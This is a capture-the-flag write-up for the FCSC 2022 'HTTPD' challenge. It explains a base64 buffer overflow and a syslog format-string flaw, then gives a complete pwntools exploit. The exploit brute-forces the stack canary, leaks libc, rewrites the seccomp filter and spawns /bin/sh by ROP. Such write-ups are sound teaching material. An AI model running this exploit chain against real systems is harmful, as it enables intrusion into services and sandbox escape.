## FCSC 20222 - HTTPD

### The vulnerability

Spoilers ahead: this one hides two vulnerabillities, a buffer overflow and a format string, you can skip this part if you already know about it, go straight for the reverse engineering part.

We already covered the principles of a format string vulnerability before, so let's talk about a buffer overflow for the unholy that reads this.

This one needs a lots of things to be put together. I won't be able to do a full explication of everything, so I will try to vulgarize as much as I can.

For a function to return to it's calling parent, it needs to store the address to get back to somewhere, and it's on the stack. This pointer will be retrieved, and jumped into. This whole process is detailed on the "Calling Convention" of each architecture, look it up !

When, as a developper, you declare a variable that is not a bit "special" (such as malloc'd data or global variables), it will be held within a memory segment that is called the stack. Each functions have their own stack parts, their stackframe.

The return pointer that we talked about before. is at the end of the said stack frame. That means that every variables of the function, is before the return pointer.

For the next, the name gives it away: if we can overflow from a variable, we may be able to overwrite the return pointer. if we can do that, we can control the pointer that will be jumped into at the end of the function.

```
0x7fffc0f3: 0x61616161 <- here lies a char buffer[4] that is filled with 'a'
[...]
0x7fffdead: 0x51678756 <- this is a valid .text address that leads to part of code to return to.

The goal is to simply do that:

0x7fffc0f3: 0x61616161 <- here lies a char buffer[4] that is filled with 'a'
[...]
0x7fffdead: 0x61616161 <- this is a valid .text address that leads to part of code to return to, now also filled with 'a'.
```

A protection has been designed in order to limit that vulnerability, it's called a stack canary. It's a random value that is put a bit before the return pointer, and checked before the return of the function. If the canary has been overwritten, the function raises an exception and exit itself.

```
0x7fffc0f3: 0x61616161 <- here lies a char buffer[4] that is filled with 'a'
[...]
0x7fffde9d: 0xa65490be <- Random value used as a canary
0x7fffdead: 0x51678756 <- this is a valid .text address that leads to part of code to return to.

The goal is to simply not do that:

0x7fffc0f3: 0x61616161 <- here lies a char buffer[4] that is filled with 'a'
[...]
0x7fffde9d: 0x61616161 <- Random value used as a canary, it has been smashed when trying to overwrite the return pointer, the function will exit with an exception, and makes us unable to return where we want.
0x7fffdead: 0x61616161 <- this is a valid .text address that leads to part of code to return to, now also filled with 'a'.
```

The last thing we have to cover in order for you, unholy, to understand the next parts of this writeup is the process of "ROP", Return Oriented Programming.

The idea is simple, if we can take the control of the execution flow by overwriting a value of the stack that will be jumped into after a "ret" instruction, why couldn't we do that over and over again with more ret instructions ?

We, firstly, overwrite the first ret pointer. but we make it point to part of code that do one thing and then ret again:
```
0x7fffc0f3: 0x61616161 <- here lies a char buffer[4] that is filled with 'a'
[...]
0x7fffdead: 0x77b4b3 <- this is a valid .text address that leads to part of code to return to: "pop rdi ; ret ;".
```

We, then play around the part of code that we will return to (it's called a gadget), by adding a value to be popped by rdi.

```
0x7fffc0f3: 0x61616161 <- here lies a char buffer[4] that is filled with 'a'
[...]
0x7fffdead: 0x77b4b3 <- this is a valid .text address that leads to part of code to return to: "pop rdi ; ret ;".
0x7fffdeb5: 0x000000 <- rdi will pop 0
0x7fffdebd: 0x77b33f <- our new valid address that leads to a function which needs rdi to be 0 to work.
```

Here, when rdi will pop, that will remove 0x00000 from the stack, and ret will pop and jump into our next part of code. This is a rop chain.

### Reverse Engineering

This time we have the whole C code.
IDA is a lot nicer to look at, but, because of my immense indulgence for the unholy ~~and not at all because I'm too lazy to launch it again~~, we will use it here.

#### Overview:
This binary launches a "http" server, that doesn't rely on any sockets, uses stdin and stdout as input and output.

It's supposed to get ourselves into a page that asks for a Basic Auth authentication.

In order to do that, it holds a HTTP parser, and also a base64 decoder for the Basic Auth part.
If we provide the good username and password, the server is happy, if we don't, he is not.

That's basically it conserning the user functionallities.

Now concerning the internals, we note that we can give a byte input unrestricted by size, we not that that input will be parsed following HTTP rules, a part of it will be parse following base64 rules, and this part will then end up in an authentication check function.

Which leads us to 3 things that can go wrong with our inputs: The http parser, the base64 parser, and the authentication part.

However, all those parts are executing in a sandbox environment. This sandbox is about a fork, were the code will be executed, and a heavy seccomp. A seccomp is a set of rules that allow, or deny, the use of specific syscalls. By using seccomp-tools, we notice the following rules:
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0009
 0004: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0009
 0005: 0x15 0x03 0x00 0x0000000f  if (A == rt_sigreturn) goto 0009
 0006: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0009
 0007: 0x15 0x01 0x00 0x0000000c  if (A == brk) goto 0009
 0008: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 ```

Every syscall that is not read, write, sigreturn, exit or brk will cause the immediate termination of the process.

#### In-Depth:

I got into the part that contained the least code first: the Authentication part. I honestly thought that it would be a honey-pot for reversers, but it turned out it wasn't.

```c
bool checkAuth(const char *b64, struct shared *shared)
{
	char creds[0x100] = {};

	if(true != b64_decode(b64, strlen(b64), creds)) {
		askAuth("Malformed base64");
		return false;
	}

	DEBUG("creds = %s\n", creds);

	/* Parse creds */
	char *saveptr;
	const char *login    = strtok_r(creds, ":", &saveptr);
	const char *password = strtok_r(NULL,  "",  &saveptr);

	/* Check login */
	if(0 != strcmp(login, LOGIN)) {
		askAuth("Invalid username");
		return false;
	}

	/* Check password */
	if(0 != strcmp(password, PASSWORD)) {
		askAuth("Invalid password");
		return false;
	}

	/* We're all set, keep track of the user */
	strncpy(shared->username, login, sizeof(shared->username));
	shared->loggedin = true;

	return true;
}
```

The first thing you want to check when you look for vulnerabilities, is for buffers and how they are filled.

We have one buffer here: creds.
It is filled on the next function: b64_decode. It takes creds as destination for a base64 input (our Basic Auth check), and never considere the size of creds.

That means that there is a buffer overflow in creds. If the result of the base64 is longer than 0x100, we will overflow.

Concerning the main, it looks like this:
```c
int main(void)
{
	/* Prepare malloc arena
	 *
	 * Since every workers are sandboxed with seccomp, we cannot use the
	 * getrandom(2) syscall.
	 *
	 * malloc calls ptmalloc_init, tcache_key_initialize, and then
	 * __getrandom.
	 *
	 * This means that any function that allocates memory dynamically will
	 * get a SIGKILL in the sandbox... unless the tcache key is *already*
	 * generated. This is what this call does.
	 */
	free(malloc(0));

	setbuf(stdin,  NULL);
	setbuf(stdout, NULL);

	/* Prepare shared memory segment */
	struct shared *shared = mmap(NULL, sizeof(*shared),
		PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	if(MAP_FAILED == shared) {
		perror("mmap");
		return EXIT_FAILURE;
	}

	/* Main loop */
	do {
		int status = request(shared);
		DEBUG("status = %d\n", status);
		audit(shared, status);
	} while(shared->keepalive);

	return EXIT_SUCCESS;
}
```

A shared memory is allocated, then it loops, call process and audit in the loop.

process will fork and seccomp the child before processing a HTTP request, as follow:
```c
static int request(struct shared *shared)
{
	pid_t pid = fork();

	if(0 > pid) {
		perror("fork");
		exit(EXIT_FAILURE);
	}

	if(0 == pid) {
		sandbox(shared);
		_exit(EXIT_FAILURE);
	}

	int status;
	if(pid != waitpid(pid, &status, 0)) {
		perror("waitpid");
		exit(EXIT_FAILURE);
	}

	return status;
}
```
_
While audit will log for things:
```c
/* SPDX-License-Identifier: GPL-2.0-or-later
 *
 * This program is free software: you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation, either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program. If not, see <https://www.gnu.org/licenses/>.
 */
#include "audit.h"

#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <syslog.h>

#include "worker.h"

#define IDENT "HTTPD"

void audit(const struct shared *shared, int status)
{
	/* Do not log failed attempts, exit early */
	if(WIFEXITED(status) && !shared->loggedin)
		return;

	/* Initialize the logger */
	static bool init = false;

	if(!init) {
		openlog(IDENT, 0, LOG_DAEMON);
		init = true;
	}

	/* Determine the message and priority */
	char msg[0x200];
	int prio;

	if(WIFEXITED(status)) {
		/* Keep track of connections in the audit log */
		snprintf(msg, sizeof(msg), "LOGIN %s", shared->username);
		prio = LOG_NOTICE;
	} else if(WIFSIGNALED(status)) {
		/* Signal ? We should warn about this */
		snprintf(msg, sizeof(msg), "SIGNAL %d", WTERMSIG(status));
		prio = LOG_WARNING;
	} else {
		/* ??? */
		snprintf(msg, sizeof(msg), "UNKNOWN %d", status);
		prio = LOG_CRIT;
	}

	/* Send the actual message to the logger */
	syslog(prio, msg, 0);
}
```

The goal after the reverse engineering part is clear: Use the buffer overflow to take control of a child, and find a way to get over the seccomp in order to call a shell.

### Exploitation

The binary is protected by a stack canary, it's also PIE'd.
That means that our buffer overflow won't result in anything if we can't find a way to leak a .text address, and to leak the canary.

However, we are lucky. Our requests are fork'd, and fork doesn't create a new process with a whole new memory layout. It copies the parent memory, and then spawn a new process. What that means is that every forks will have the same canary, and the same .text base.

If we can find something to display in case the return goes well, and something to display in case the return goes wrong, we will be able to bruteforce byte by byte the canary and the return address, giving us both the leaks we need.

If we check at the calling function, worker, we can see that it prints something if our username and password are both rights:
```c
	if(!checkAuth(b64, shared))
		return false;

	/* All that fuss for what ? */
	http_text(HTTP_STATUS_OK, "Congratulations! Now get the flag.");
```

So we have our victory print, if the return of checkAuth goes right, with a good username and password, we will have a print.

We just have to code something that bruteforces the necessary bytes:

```python
baseSize = (280-12-16)
def genPayload(payload):
    base = b"admin:admin\x00" + b"a" * baseSize
    return b"""GET / HTTP/1.1\r
    Connection: keep-alive\r
    Authorization: Basic """ + base64.b64encode(base + payload) +b"\r\n\r\n"


def leak64(prefix = b""):
    cookie = [0] * 8
    for i in range(8):
        for x in range(0, 256):
            cookie[i] = p8(x)
            cur = b"".join(cookie[:i+1])
            print(cur)
            io.send(genPayload(prefix + cur))

            r = io.recvuntil(b"\r\n\r\n", timeout=0.18) # if we received a HTTP request-like answer, it means it's the right byte
            if r != b"":
                c = io.recvuntil(b"flag.", timeout=0.18)
                if c == b"":
                    continue
                break
    return(u64(b"".join(cookie)))
```

Okay, now we can ROP without any constraints.
We will need a libc leak though, so let's get it.

```python
rop = ROP(exe) # pwntools library, really cool one
rop.raw(cookie)
rop.raw(rbp)
rop.puts(exe.got["puts"])
io.send(genPayload(rop.chain()))
putsAddr = io.recvline()[:-1]
putsAddr += b"\x00" * (8-len(putsAddr))
putsAddr = u64(putsAddr)
print(hex(putsAddr))
```

Usually, when we have full ROP capacities with leaks of everything, it's really easy to get a shell. However, in order to print the flag, we would have to, at least, have access to the open syscall, or mmap.

We have neither, let alone execve, which would fail to execute a decent .bin/sh anyway without open.

So here lies the difficulty of this challenge: bypassing the seccomp.

I initally thought about the classing seccomp bypass. One is about using 32bit code in order to have access to the 32 bit syscall table, which means different syscall numbers, and the second one is about adding 0x40000000 to the syscall number in order to process the x32 syscall ABI table.

None of them will work here, the first one wouldn't because of the lines 
```
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
``` 

which checks for the architecture to be exclusevly x86_64, and the second wouldn't either because the checks are not done in a blacklist way, it's a whitelist. So 0x400000be is as faulty as 0xbe.

At this point I still checked a bit on the internet to see if there wasn't another way to bypass seccomp rules, that was it.

That can only mean one thing: We can play around this seccomp without bypassing it.

The father process is not incapacitated by those seccomp rules, so it's our first hope.

The only moment when our input is acknowledged by the father process, is, as I said before, during the audit function:

```
void audit(const struct shared *shared, int status)
{
	/* Do not log failed attempts, exit early */
	if(WIFEXITED(status) && !shared->loggedin)
		return;

	/* Initialize the logger */
	static bool init = false;

	if(!init) {
		openlog(IDENT, 0, LOG_DAEMON);
		init = true;
	}

	/* Determine the message and priority */
	char msg[0x200];
	int prio;

	if(WIFEXITED(status)) {
		/* Keep track of connections in the audit log */
		snprintf(msg, sizeof(msg), "LOGIN %s", shared->username);
		prio = LOG_NOTICE;
	} else if(WIFSIGNALED(status)) {
		/* Signal ? We should warn about this */
		snprintf(msg, sizeof(msg), "SIGNAL %d", WTERMSIG(status));
		prio = LOG_WARNING;
	} else {
		/* ??? */
		snprintf(msg, sizeof(msg), "UNKNOWN %d", status);
		prio = LOG_CRIT;
	}

	/* Send the actual message to the logger */
	syslog(prio, msg, 0);
}
```

First thing I did, were to see that there is a buffer, and when there is a buffer, I check how it's filled. it's effectively filled with our input, but in a safe way unfortunately. snprintf is a function that will limit itself to the number used as a second parameter, which is the maximum size of message.

I checked what syslog did rapidely and saw that it would print things in the syslog of the host machine, so, dumb as I am, I imagined a challenge where you had to crash another process that would read the logs and all... Well, that wasn't it.

I also checked if the flag wasn't the username of another user that would connect himself, a bot most likely. An organizer confirmed me that if there were a bot, it would have been mention in the description.

Then I noticed that it was the only pwn challenge where the presence of a flag.txt wasn't mentionned in the description, so I started scanning the whole memory of the remote process to check for a flag, maybe in a loaded library ?

That wasn't it either.

After a good afternoon lost on that, I then started to read again the manual of the functions that used our input in the father, maybe snprintf puts a \x00 at maxSize +1 ?
And that's how I learnt about something I really didn't expected: syslog doesn't take a string to log, it takes a **format** string. As mentionned in the manual:

```
The remaining arguments are a format, as in printf(3), and any
arguments required by the format, except that the two-character
sequence %m will be replaced by the error message string
strerror(errno).  The format string need not include a
terminating newline character.
```

And that's an auto-slap from myself for not reading manuals correctly.

Once that information is known, it's quite straight-forward.

The sandbox uses a bpf in order to apply its rules. A bpf is a structure that dictates the said rules, which means that it's a structure in memory.

That also means that, since they lies according to the code, in the data segment, it's rewritable.

Since we have a format string vulnerability, we can just, from the father, rewrite the bpf structure in order for it to be an ALLOW_ALL set of rules, and when the new process will be forked and the new seccomp rules applies, we will have a seccomp free process to take control of.

A little ROP and we're good.

#### Conclusion

A really cool challenge that was really rewarding. I love pwn challenges that doesn't rely on a single vulnerability.
For this one, I could have been quicker with either a better overall knowledge (which would have make me notice instantly the format string vulnerability), or a better way of reading manuals fast without losing crutial informations.

Here again: an exploit as raw as it was during its development.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template httpd
from sys import prefix
from pwn import *
import base64
# Set up pwntools for the correct architecture
exe = context.binary = ELF('httpd')
context.terminal = "gnome-terminal -- bash -c".split(" ")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REM:
        return remote("challenges.france-cybersecurity-challenge.fr", 2058)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set follow-fork-mode child
set detach-on-fork off
b audit
b request
b *(unsigned long long *)(&checkAuth+657)
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

baseSize = (280-12-16)
def genPayload(payload):
    base = b"admin:admin\x00" + b"a" * baseSize
    return b"""GET / HTTP/1.1\r
    Connection: keep-alive\r
    Authorization: Basic """ + base64.b64encode(base + payload) +b"\r\n\r\n"

def genPayloadf(payload):
    base = b"adsin:acmin\x00" + b"a" * baseSize
    return b"""GET / HTTP/1.1\r
    Connection: keep-alive\r
    Authorization: Basic """ + base64.b64encode(base + payload) +b"\r\n\r\n"


def leak64(prefix = b""):
    cookie = [0] * 8
    for i in range(8):
        for x in range(0, 256):
            cookie[i] = p8(x)
            cur = b"".join(cookie[:i+1])
            print(cur)
            io.send(genPayload(prefix + cur))

            r = io.recvuntil(b"\r\n\r\n", timeout=0.18)
            if r != b"":
                c = io.recvuntil(b"flag.", timeout=0.18)
                if c == b"":
                    continue
                break
    return(u64(b"".join(cookie)))

io = start()

if args.REM:
    cookie = leak64()
    rbp = 0
    workerAddr = leak64(p64(cookie) + p64(rbp)) - 191
else:
    cookie = p64(0)#leak64()
    rbp = 0
    workerAddr = 0x5555555567df#leak64(p64(cookie) + p64(rbp)) - 191

exe.address = workerAddr - exe.symbols["worker"]

if not args.GDB:
    rop = ROP(exe)
    rop.raw(cookie)
    rop.raw(rbp)
    rop.puts(exe.got["puts"])
    io.send(genPayload(rop.chain()))
    putsAddr = io.recvline()[:-1]
    putsAddr += b"\x00" * (8-len(putsAddr))
    putsAddr = u64(putsAddr)
    print(hex(putsAddr))

    libc = ELF("./libc.so.6")
    libc.address = putsAddr - libc.symbols["puts"]

    rop = ROP(exe)
    rop.raw(cookie)
    rop.raw(rbp)
    rop.puts(libc.symbols["environ"])
    io.send(genPayload(rop.chain()))
    environ = io.recvline()[:-1]
    environ += b"\x00" * (8-len(environ))
    environ = u64(environ)
    print(hex(environ))
else:
    putsAddr = 0x7ffff7e559d0
    environ = 0x00007fffffffdc68
    libc = ELF("./libc.so.6")
    libc.address = putsAddr - libc.symbols["puts"]

    # io.interactive()
rop = ROP(libc)
rop.raw(cookie)
rop.raw(rbp)

for i in range(0x10):
    rop.raw(libc.address + 0x00000000000ca9ab)
rop.gets()
rop.call(exe.symbols["_exit"], [-45])

io.send(genPayload(rop.chain()))

writes = {exe.symbols["filter.0"] + 70:   0x7fff-6}
print(hex(exe.symbols["filter.0"] + 68))

payload = fmtstr_payload(10, writes, numbwritten=2, write_size="short")
print(payload)

io.sendline(b"\x01\x01aa" + payload.replace(b"lln", b"hna"))

io.send(genPayloadf(b"s"))

rop = ROP(libc)
rop.raw(cookie)
rop.raw(rbp)
rop.execve(next(libc.search(b"/bin/sh\x00")), 0, 0)

io.recvuntil(b"username")
io.send(genPayload(rop.chain()))
io.interactive()
```
